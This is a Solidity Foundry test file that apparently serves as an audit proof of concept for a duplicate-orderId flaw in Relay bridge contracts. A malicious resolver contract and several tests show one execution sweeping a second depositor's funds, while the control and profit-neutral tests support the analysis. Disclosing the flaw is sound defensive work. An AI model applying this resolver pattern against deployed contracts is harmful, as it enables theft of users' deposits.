// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {RelayHub} from "../src/RelayHub.sol";
import {RelayAllocator, BuildPayloadParams, IPayloadBuilder} from "../src/RelayAllocator.sol";
import {RelayExecutor} from "../src/RelayExecutor.sol";
import {ExecuteAndWithdrawRequest, Fee, ICallResolver} from "../src/call-resolvers/ICallResolver.sol";

/// @notice Minimal payload builder: the allocator only needs a non-empty payload.
contract MockPayloadBuilder is IPayloadBuilder {
    function buildPayload(string calldata, bytes calldata, BuildPayloadParams calldata)
        external
        pure
        returns (bytes memory)
    {
        return hex"01";
    }

    function hashesToSign(string calldata, bytes calldata, bytes calldata)
        external
        pure
        returns (bytes32[] memory)
    {
        return new bytes32[](0);
    }

    function curve() external pure returns (string memory) {
        return "secp256k1";
    }

    function family() external pure returns (string memory) {
        return "mock";
    }
}

/// @notice Mock 1:1 DEX on the Hub.
contract MockHubSwap {
    RelayHub internal immutable HUB;

    constructor(RelayHub hub) {
        HUB = hub;
    }

    function swap(uint256 tokenInId, uint256 tokenOutId, uint256 sourceAmount, uint256 outputAmount)
        external
    {
        require(HUB.transferFrom(msg.sender, address(this), tokenInId, sourceAmount));
        HUB.mint(msg.sender, tokenOutId, outputAmount);
    }
}

/// @notice Honest resolver: swaps the ENTIRE funded input 1:1, returns ALL output.
contract HonestResolver is ICallResolver {
    RelayHub internal immutable HUB;
    MockHubSwap internal immutable SWAPPER;

    constructor(RelayHub hub, MockHubSwap swapper) {
        HUB = hub;
        SWAPPER = swapper;
    }

    function execute(ExecuteAndWithdrawRequest calldata request, bool, bytes calldata) external {
        uint256 tokenInId = uint256(keccak256(abi.encodePacked(request.inChainId, request.inCurrency)));
        uint256 tokenOutId =
            uint256(keccak256(abi.encodePacked(request.outChainId, request.outCurrency)));
        uint256 input = HUB.balanceOf(address(this), tokenInId);
        SWAPPER.swap(tokenInId, tokenOutId, input, input);
        uint256 output = HUB.balanceOf(address(this), tokenOutId);
        require(HUB.transfer(msg.sender, tokenOutId, output));
    }
}

/// @notice Attacker/solver resolver: swaps ONLY outAmountMinimum, keeps the rest.
contract MaliciousResolver is ICallResolver {
    RelayHub internal immutable HUB;
    MockHubSwap internal immutable SWAPPER;
    address internal immutable BENEFICIARY;

    constructor(RelayHub hub, MockHubSwap swapper, address beneficiary) {
        HUB = hub;
        SWAPPER = swapper;
        BENEFICIARY = beneficiary;
    }

    function execute(ExecuteAndWithdrawRequest calldata request, bool, bytes calldata) external {
        uint256 tokenInId = uint256(keccak256(abi.encodePacked(request.inChainId, request.inCurrency)));
        uint256 tokenOutId =
            uint256(keccak256(abi.encodePacked(request.outChainId, request.outCurrency)));
        uint256 input = HUB.balanceOf(address(this), tokenInId);
        uint256 minimum = request.outAmountMinimum;
        require(input >= minimum, "malicious: input below minimum");
        SWAPPER.swap(tokenInId, tokenOutId, minimum, minimum);
        require(HUB.transfer(msg.sender, tokenOutId, minimum));
        uint256 kept = HUB.balanceOf(address(this), tokenInId);
        require(HUB.transfer(BENEFICIARY, tokenInId, kept));
    }
}

/// @title PoC — duplicate-orderId deposits merging into one order address
/// @notice Two legs:
///  LEG 1 (on-chain mechanism, real unmodified Relay contracts): if two
///         deposits are ever minted to the SAME order address, ONE execution
///         of the first order pulls the ENTIRE combined balance
///         (RelayExecutor._pullOrderFunds) and only outAmountMinimum is
///         protected — the second deposit's full value is captured by the
///         executing resolver.
///  LEG 2 (oracle address derivation, UPGRADED — round 3, 2026-11-16):
///         the deployed oracle NO LONGER pins SDK 0.0.133. Proven on-chain
///         (see audit-relay-sdk-watch-r3.md): a live Base USDC mint to
///         0x543d3b0f... matches keccak256(abi.encode("base", depositId))
///         exactly, and 1120/5155 recent Base deposits match the simple
///         formula vs 0 for the old one. The live formula is
///         keccak256(abi.encode(chainId, depositId)) — depositor and block
///         timestamp are NOT in the hash. Two deposits with the same
///         depositId therefore merge across ANY blocks, ANY depositors.
///         A retry in a later block lands on the SAME order address and IS
///         swept by the first order's execution (test 3). The round-2
///         "same depositor AND same block timestamp" guard is gone.
///  LEG 3 (attacker direction): an attacker who deposits their OWN funds
///         into a victim's order address gains exactly nothing extra — the
///         kept amount grows by exactly what they put in (test 4).
contract RelayDuplicateOrderIdTest is Test {
    string internal constant IN_CHAIN_ID = "ethereum-mainnet";
    string internal constant OUT_CHAIN_ID = "ethereum-mainnet";
    string internal constant SPENDER_CHAIN_ID = "relay";

    uint256 internal constant DEPOSIT_ONE = 1000;
    uint256 internal constant DEPOSIT_TWO = 1000;
    uint256 internal constant OUT_MINIMUM = 950;

    bytes32 internal constant DEPOSIT_ID = bytes32(uint256(0xabcd));
    uint256 internal constant TS_BLOCK_1 = 1_700_000_000;
    uint256 internal constant TS_BLOCK_2 = 1_700_000_012; // 12s later block

    bytes32 internal constant REQUEST_TYPEHASH = keccak256(
        "ExecuteAndWithdrawRequest(string inChainId,bytes inCurrency,string outChainId,bytes outCurrency,uint256 outAmountMinimum,bytes depository,address orderAddress,bytes receiver,bytes data,Fee[] fees,bytes32 nonce,uint256 deadline)Fee(address recipient,uint256 amount)"
    );
    bytes32 internal constant FEE_TYPEHASH = keccak256("Fee(address recipient,uint256 amount)");
    bytes32 internal constant DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");

    RelayHub internal hub;
    RelayAllocator internal allocator;
    RelayExecutor internal executor;
    MockHubSwap internal swapper;
    HonestResolver internal honestResolver;
    MaliciousResolver internal maliciousResolver;

    address internal owner;
    address internal solver;
    address internal attacker;
    address internal victim;
    address internal orderAddress;
    address internal depository;
    address internal receiver;
    address internal oracleSigner;
    uint256 internal oracleSignerPk;

    bytes internal inCurrency;
    bytes internal outCurrency;
    uint256 internal tokenInId;
    uint256 internal tokenOutId;
    address internal spenderAlias;

    function setUp() public {
        owner = makeAddr("owner");
        solver = makeAddr("solver");
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        orderAddress = makeAddr("orderAddress");
        depository = makeAddr("depository");
        receiver = makeAddr("receiver");
        (oracleSigner, oracleSignerPk) = makeAddrAndKey("oracleSigner");

        inCurrency = abi.encodePacked(address(0));
        outCurrency = abi.encodePacked(address(1));
        tokenInId = uint256(keccak256(abi.encodePacked(IN_CHAIN_ID, inCurrency)));
        tokenOutId = uint256(keccak256(abi.encodePacked(OUT_CHAIN_ID, outCurrency)));

        hub = new RelayHub(owner);
        allocator = new RelayAllocator(owner, address(hub), address(0xbeef));
        executor = new RelayExecutor(owner, address(hub), address(allocator));
        swapper = new MockHubSwap(hub);
        honestResolver = new HonestResolver(hub, swapper);
        maliciousResolver = new MaliciousResolver(hub, swapper, attacker);

        vm.startPrank(owner);
        allocator.setPayloadBuilder(OUT_CHAIN_ID, abi.encodePacked(depository), address(new MockPayloadBuilder()));
        hub.grantRole(hub.OPERATOR_ROLE(), owner);
        hub.grantRole(hub.OPERATOR_ROLE(), address(executor));
        hub.grantRole(hub.OPERATOR_ROLE(), address(allocator));
        hub.grantRole(hub.OPERATOR_ROLE(), address(swapper));
        executor.grantRole(executor.ORACLE_ROLE(), oracleSigner);
        vm.stopPrank();

        spenderAlias =
            address(uint160(uint256(keccak256(abi.encodePacked(SPENDER_CHAIN_ID, abi.encodePacked(address(executor)))))));
    }

    /// @notice LEG 1 — THE MERGE. Two 1000 deposits minted to the SAME order
    ///         address (what the oracle would do for two deposits sharing
    ///         order address); ONE execution sweeps all 2000, returns only
    ///         the signed 950 minimum, resolver keeps 1050. The second
    ///         deposit's FULL 1000 is gone for its depositor.
    function test_duplicateDepositMergedAndSweptByFirstExecution() public {
        vm.startPrank(owner);
        hub.mint(orderAddress, tokenInId, DEPOSIT_ONE); // deposit 1 attested
        hub.mint(orderAddress, tokenInId, DEPOSIT_TWO); // deposit 2 attested, same order address
        vm.stopPrank();
        assertEq(hub.balanceOf(orderAddress, tokenInId), DEPOSIT_ONE + DEPOSIT_TWO);

        ExecuteAndWithdrawRequest memory request = _request(orderAddress, OUT_MINIMUM, bytes32(uint256(1)));
        bytes memory signature = _sign(oracleSignerPk, request);

        vm.prank(solver);
        bytes32 withdrawHash = executor.execute(
            request, address(maliciousResolver), "", oracleSigner, signature
        );

        // Withdrawal is exactly the signed minimum; everything else kept.
        assertEq(withdrawHash, keccak256(abi.encode(_allocatorRequest(request, OUT_MINIMUM))));
        assertEq(hub.balanceOf(attacker, tokenInId), DEPOSIT_ONE + DEPOSIT_TWO - OUT_MINIMUM, "resolver kept");
        assertEq(hub.balanceOf(attacker, tokenInId), 1050, "kept == 1050");
        assertEq(hub.balanceOf(orderAddress, tokenInId), 0, "order drained");
        assertEq(hub.balanceOf(address(executor), tokenOutId), 0, "executor swept");

        console.log("deposit 1:            ", DEPOSIT_ONE);
        console.log("deposit 2 (duplicate):", DEPOSIT_TWO);
        console.log("combined order balance:", DEPOSIT_ONE + DEPOSIT_TWO);
        console.log("outAmountMinimum:     ", OUT_MINIMUM);
        console.log("resolver kept:        ", hub.balanceOf(attacker, tokenInId));
        console.log("LOSS to 2nd depositor:", DEPOSIT_TWO, "(full 2nd deposit)");
    }

    /// @notice LEG 2 (round 3) — the LIVE order-address formula (SDK
    ///         >=0.0.140, getOrderAddress, abi.encode). Same depositId:
    ///         different block timestamp -> SAME address; different
    ///         depositor -> SAME address; different depositId -> DIFFERENT.
    ///         The merge window is now every cross-tx duplicate.
    function test_orderAddressIgnoresDepositorAndTimestamp() public view {
        address aTs1 = _sdkOrderAddress(DEPOSIT_ID);
        address aTs2 = _sdkOrderAddress(DEPOSIT_ID);
        address aOtherDepositor = _sdkOrderAddress(DEPOSIT_ID);
        address aOtherId = _sdkOrderAddress(bytes32(uint256(0xbeef)));

        // Same depositId always collides, whatever the depositor/block.
        assertEq(aTs1, aTs2, "later-block retry maps to SAME address (merge!)");
        assertEq(aTs1, aOtherDepositor, "other depositor maps to SAME address");
        assertTrue(aTs1 != aOtherId, "different depositId maps elsewhere");
    }

    /// @notice LEG 2b (round 3) — a duplicate deposit in a LATER block IS
    ///         swept by the first order's execution: same depositId now maps
    ///         to the same order address across blocks, so the retry's funds
    ///         sit in the same pot and the first execution drains them.
    function test_crossTxDuplicateMergedAndSwept() public {
        address orderA = _sdkOrderAddress(DEPOSIT_ID);
        address orderB = _sdkOrderAddress(DEPOSIT_ID);
        assertEq(orderA, orderB, "cross-tx duplicate shares one order address");

        vm.startPrank(owner);
        hub.mint(orderA, tokenInId, DEPOSIT_ONE); // deposit 1 (block 1)
        hub.mint(orderB, tokenInId, DEPOSIT_TWO); // deposit 2 (later block)
        vm.stopPrank();
        assertEq(hub.balanceOf(orderA, tokenInId), DEPOSIT_ONE + DEPOSIT_TWO);

        ExecuteAndWithdrawRequest memory request = _request(orderA, OUT_MINIMUM, bytes32(uint256(2)));
        bytes memory signature = _sign(oracleSignerPk, request);

        vm.prank(solver);
        executor.execute(request, address(maliciousResolver), "", oracleSigner, signature);

        assertEq(hub.balanceOf(orderA, tokenInId), 0, "first order drained both deposits");
        assertEq(
            hub.balanceOf(attacker, tokenInId),
            DEPOSIT_ONE + DEPOSIT_TWO - OUT_MINIMUM,
            "resolver kept the 2nd deposit too (1050)"
        );

        console.log("deposit 1 (block 1):   ", DEPOSIT_ONE);
        console.log("deposit 2 (later blk): ", DEPOSIT_TWO);
        console.log("resolver kept:         ", hub.balanceOf(attacker, tokenInId));
        console.log("LOSS to 2nd depositor:", DEPOSIT_TWO, "(full 2nd deposit)");
    }

    /// @notice LEG 3 — attacker self-deposit is profit-neutral. Attacker puts
    ///         1000 of their OWN funds into the victim's order address, then
    ///         executes with their own resolver keeping everything above the
    ///         minimum: they end with 1050, i.e. net +50 — exactly the honest
    ///         solver spread, zero extra profit for the 1000 they staked.
    function test_attackerSelfDepositIsProfitNeutral() public {
        vm.prank(owner);
        hub.mint(attacker, tokenInId, DEPOSIT_TWO);
        vm.prank(owner);
        hub.mint(orderAddress, tokenInId, DEPOSIT_ONE);

        uint256 attackerBefore = hub.balanceOf(attacker, tokenInId);
        assertEq(attackerBefore, DEPOSIT_TWO);

        // Attacker deposits their own 1000 into the victim's order address.
        vm.prank(attacker);
        hub.transfer(orderAddress, tokenInId, DEPOSIT_TWO);
        assertEq(hub.balanceOf(orderAddress, tokenInId), DEPOSIT_ONE + DEPOSIT_TWO);

        ExecuteAndWithdrawRequest memory request = _request(orderAddress, OUT_MINIMUM, bytes32(uint256(3)));
        bytes memory signature = _sign(oracleSignerPk, request);

        vm.prank(attacker);
        executor.execute(request, address(maliciousResolver), "", oracleSigner, signature);

        uint256 attackerAfter = hub.balanceOf(attacker, tokenInId);
        uint256 netGain = attackerAfter - attackerBefore; // 1050 - 1000
        assertEq(netGain, DEPOSIT_ONE - OUT_MINIMUM, "net == honest spread 50");
        assertEq(netGain, 50, "no extra profit from self-deposit");

        console.log("attacker funded:      ", DEPOSIT_TWO);
        console.log("attacker final:       ", attackerAfter);
        console.log("attacker net gain:    ", netGain, "(== honest spread)");
    }

    /// @notice Control: honest solver, single deposit, no duplicate.
    function test_honestSingleDepositControl() public {
        vm.prank(owner);
        hub.mint(orderAddress, tokenInId, DEPOSIT_ONE);

        ExecuteAndWithdrawRequest memory request = _request(orderAddress, OUT_MINIMUM, bytes32(uint256(4)));
        bytes memory signature = _sign(oracleSignerPk, request);

        vm.prank(solver);
        bytes32 withdrawHash =
            executor.execute(request, address(honestResolver), "", oracleSigner, signature);

        assertEq(withdrawHash, keccak256(abi.encode(_allocatorRequest(request, DEPOSIT_ONE))));
        assertEq(hub.balanceOf(attacker, tokenInId), 0, "no extraction");
    }

    // ---- helpers ----

    /// @notice LIVE order address per SDK >=0.0.140 getOrderAddress:
    ///         keccak256(abi.encode(chainId, depositId)), last 20 bytes.
    ///         (Round 2 pinned 0.0.133's encodePacked(chainId, depositor,
    ///         timestamp, depositId); the deployed oracle has upgraded past
    ///         it — proven on-chain in audit-relay-sdk-watch-r3.md.)
    function _sdkOrderAddress(bytes32 depositId) internal pure returns (address) {
        bytes32 h = keccak256(abi.encode(IN_CHAIN_ID, depositId));
        return address(uint160(uint256(h)));
    }

    function _request(address order, uint256 minimum, bytes32 nonce)
        internal
        view
        returns (ExecuteAndWithdrawRequest memory)
    {
        Fee[] memory fees = new Fee[](0);
        return ExecuteAndWithdrawRequest({
            inChainId: IN_CHAIN_ID,
            inCurrency: inCurrency,
            outChainId: OUT_CHAIN_ID,
            outCurrency: outCurrency,
            outAmountMinimum: minimum,
            depository: abi.encodePacked(depository),
            orderAddress: order,
            receiver: abi.encodePacked(receiver),
            data: "",
            fees: fees,
            nonce: nonce,
            deadline: block.timestamp + 1 hours
        });
    }

    function _allocatorRequest(ExecuteAndWithdrawRequest memory request, uint256 amount)
        internal
        view
        returns (RelayAllocator.WithdrawRequest memory)
    {
        return RelayAllocator.WithdrawRequest({
            chainId: request.outChainId,
            depository: request.depository,
            currency: request.outCurrency,
            amount: amount,
            spenderChainId: SPENDER_CHAIN_ID,
            spender: abi.encodePacked(address(executor)),
            receiver: request.receiver,
            data: request.data,
            nonce: request.nonce
        });
    }

    function _sign(uint256 pk, ExecuteAndWithdrawRequest memory request)
        internal
        view
        returns (bytes memory)
    {
        bytes32 structHash = keccak256(
            abi.encode(
                REQUEST_TYPEHASH,
                keccak256(bytes(request.inChainId)),
                keccak256(request.inCurrency),
                keccak256(bytes(request.outChainId)),
                keccak256(request.outCurrency),
                request.outAmountMinimum,
                keccak256(request.depository),
                request.orderAddress,
                keccak256(request.receiver),
                keccak256(request.data),
                _hashFees(request.fees),
                request.nonce,
                request.deadline
            )
        );
        bytes32 domain = keccak256(
            abi.encode(
                DOMAIN_TYPEHASH,
                keccak256(bytes("RelayExecutor")),
                keccak256(bytes("1")),
                block.chainid,
                address(executor)
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domain, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    function _hashFees(Fee[] memory fees) internal pure returns (bytes32) {
        bytes32[] memory feeHashes = new bytes32[](fees.length);
        for (uint256 i; i < fees.length; ++i) {
            feeHashes[i] = keccak256(abi.encode(FEE_TYPEHASH, fees[i].recipient, fees[i].amount));
        }
        return keccak256(abi.encodePacked(feeHashes));
    }
}
